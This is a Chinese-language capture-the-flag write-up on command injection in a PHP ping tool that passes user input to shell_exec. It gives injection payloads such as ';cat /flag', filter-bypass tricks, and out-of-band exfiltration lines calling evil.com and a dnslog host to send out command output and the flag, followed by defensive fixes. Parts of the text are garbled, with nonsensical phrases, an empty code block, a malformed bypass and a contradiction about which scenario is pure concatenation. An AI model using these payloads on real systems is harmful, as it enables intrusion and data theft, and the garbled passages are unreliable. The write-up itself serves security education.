## 题目背景

> Note  
> Net Diag 网络诊断工具：

- 表单输入一个 IP，点 Ping → 后端调 `ping -c 1 -W 1 <ip>` 并回显结果
- 构建命令的方式是 PHP 字符串拼接后交 `shell_exec`：

- flag 落在 `/flag`（页面明示）

一句话淳完题底：用户输入直接进了 shell，多加一个 `;` 就结束 `ping` 启动第二条命令。

## 漏洞本质

OS Command Injection（命令注入）的二法要素：

1. 程序调用了将字符串让给 shell 解析的 API（`system` / `shell_exec` / `exec` / `popen` / `passthru` / `backtick`）
2. 该字符串包含 用户可控部分 + 未经转义

双配。 → 攻击者能注入 shell 元字符，抢 ping 收了尾、打开其他命令。

本题各点查到骨构：

[代码块边界]php
$ip = $_GET['ip'] ?? '';              // 用户可控
shell_exec('ping -c 1 -W 1 ' . $ip . ' 2>&1'); // shell 解析字符串
[代码块边界]

当 `$ip = "127.0.0.1;cat /flag"` 时，实际在 shell 里的命令是：

[代码块边界]bash
ping -c 1 -W 1 127.0.0.1;cat /flag 2>&1
[代码块边界]

→ shell 看到 `;` 就把这条行拆成两条顺序执行的命令。

> Important  
> 为什么“字符串拼接”是命令注入的元凶：
>
> - 字符串不知道语义边界 — `127.0.0.1` 和 `127.0.0.1;cat /flag` 你的程序没办法区分
> - shell 却知道它有元字符表
> - "代码/数据分离"低级攻击：用 `proc_open` + 数组参数的 API 或 `escapeshellarg` 才能把边界画清

## 关键前置知识

PHP 执行 shell 的 API 家族：


## Page 84

| 函数 | 返回值 | 用途 | 本题 |
| --- | --- | --- | --- |
| `shell_exec()` / `backtick` | 字符串 | 收 stdout | ✓ |
| `system()` | 最后一行 | stdout 直输出页面 | × |
| `exec()` | 最后一行 | 第二参数数组组收 | × |
| `passthru()` | - | 直接输出 | × |
| `popen()` + `fread()` | stream | 需要流式读 | × |
| `proc_open()` | proc | 数组传参无注入风险 | × |

shell 元字符全谱：

| 符号 | 语义 | 本题可用 |
| --- | --- | --- |
| `;` | 顺序执行、不管前面成功失败 | ✓ |
| `&&` | 前成功才后执行 | ✓ |
| `\|\|` | 前失败才后执行 | ✓ |
| `\|` | 管道：前 stdout → 后 stdin | ✓（cat 不求输入也会没问题） |
| `&` | 后台执行 | ✓（但 URL 里"&"是分隔符要编码） |
| `` ` ` `` / `$()` | 命令替换 | ✓ |
| `\n`（`%0a`） | 换行 | ✓ |
| `>` / `<` | 重定向 | ✓ |

URL 中的编码陷阱（悲号）：

| 字符 | URL 编码 | 原因 |
| --- | --- | --- |
| `;` | `%3B` | ASCII 有语义 |
| （空格） | `%20` / `+` | 结构空白 |
| `&` | `%26` | URL 级分隔只强每级 |
| `\|` | `%7C` | shell 级语义 |
| `#` | `%23` | URL 片段符 |
| `=` | `%3D` | URL 对值分隔 |

特叮小结：用 `curl --data-urlencode` 或浏览器地址栏直打小心。

# 解题思路推导

## 阶段 ①："ping"就是警报线

开篇有个表单 + 输入 IP + 页面回显 `ping` 结果，行业习惯立刻丢出三个状况判断：

1. **左路子** `escapeshellarg()` + 拼接 → 防住单引号注入
2. **右路子** `system('ping '.$ip)` 直接拼 → 六哆大青就系 `;` 弄它
3. **高阶状况：** `proc_open` 用数组传参 → 难穿

按 CTF 题目最常见的总是猜度为 1、也就是纯拼接。

## 阶段 ②：用 `;cat /flag` 看利

`?ip=127.0.0.1;cat /flag` → 如果页面 `<pre>` 里后挂 flag，收工。若 shell 报 `command not found` 或字符被吃 → 转第三步。

## 阶段 ③（预备）：若基础开启被拦

- 空格被拦 → `${IFS}` / `{cat,/flag}` / Tab
- `cat` 被拦 → `c\at` / `/bin/cat` / `ca$ {u}t`
- `/flag` 被拦 → `/fl?g`、`/fla[a-z]` 通配符
- `;`、`&&` 被拦 → 换换行 `%0a`、管道 `\|`、命令替换 `` ` ` `` / `$()`

## 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| 浏览器地址栏粘贴 `;cat /flag` 被截 | URL 解析器认为 `;` 是参数分隔 | 改成 `%3B` |
| `&cat /flag` 被视为第二个 GET 参数 | `&` 是 URL 层魔法 | 改成 `%26` |
| 空格差显示（ping 报 `cat /flag` 为主机名） | shell 空白分词 | 用 `%20` / `+` / `${IFS}` |
| 输出被 `htmlspecialchars` 转义 | 页面正常显，但 `<` `>` 变 `&lt;` | 不影响看 flag，若需原始用浏览器 F12 |
| 命令 stderr 被吃 | 没带 `2>&1` | 本题白带，也题可 `cmd 2>&1` |
| `disable_functions` 持 `shell_exec` | 运行技术商环 | 换 `proc_open` / `pcntl_exec` |

# 命令注入 7 变体

> Important

1. **纯拼接（本题）**：`;` / `&&` / `\|` 直接上
2. **盲注：无回显，用** `sleep 5` / `ping -c 5 127.0.0.1` 看响应时长
3. **时间盲注**：`id|grep root && sleep 5` 编码字节不同 → 延时不同
4. **DNS 带外**：`nslookup $(whoami).evil.dnslog.cn` / `curl evil.com/?$(id)`
5. **HTTP 带外**：`wget http://evil.com/$(base64 -w0 /flag)`
6. **参数注入**：不用元字符，只给可执行文件多加一个参数一如 `curl -o /tmp/x` / `tar … --checkpoint-action=exec=…`
7. **arg inject**：`hping` 等工具支持调整然后的行为，注入的不是命令而是参数

# 关键修复

> Important

**修一（核心银弹）：用数组传参或** `escapeshellarg`

[代码块边界]php
// A. 数组传参 —— 永远不经过 shell
$p = proc_open(['ping','-c','1','-W','1',$ip], [...], $pipes);

// B. escapeshellarg —— 拼接时强制引号
shell_exec('ping -c 1 -W 1 ' . escapeshellarg($ip) . ' 2>&1');
[代码块边界]

- **方案 A 优先：消除 shell 的存在**
- `escapeshellarg` 的注意：表出的参数 `'…'` 负载 `;` 也只是字符串

**修二：输入严格验证（白名单正则）**

[代码块边界]php
if (!filter_var($ip, FILTER_VALIDATE_IP)) exit('bad ip');
// 或
if (!preg_match('/^[0-9a-zA-Z.:\-]{1,63}$/', $ip)) exit('bad host');
[代码块边界]

**修三：不用 shell，改用原生接口**

[代码块边界]php
// PHP 有 socket_create + ICMP，或用库 \Icanhazstring\Php\Ping
// 高级等级：网络诊断器中布（让 Web 只做转发，ping 在隐藏的后端服务上）
[代码块边界]

**修四：** `disable_functions` **限位**

[代码块边界]ini
disable_functions = system,exec,passthru,shell_exec,popen,proc_open,assert
[代码块边界]

- 即使有人在其他地方拖了命令执行调用，也关住了后门

**修五：容器级横向限可：** `seccomp` **禁** `execve`

[代码块边界]dockerfile
--security-opt=seccomp=./no-execve.json
[代码块边界]

- 让进程无法呼叫 execve，从内核级免下代码执行
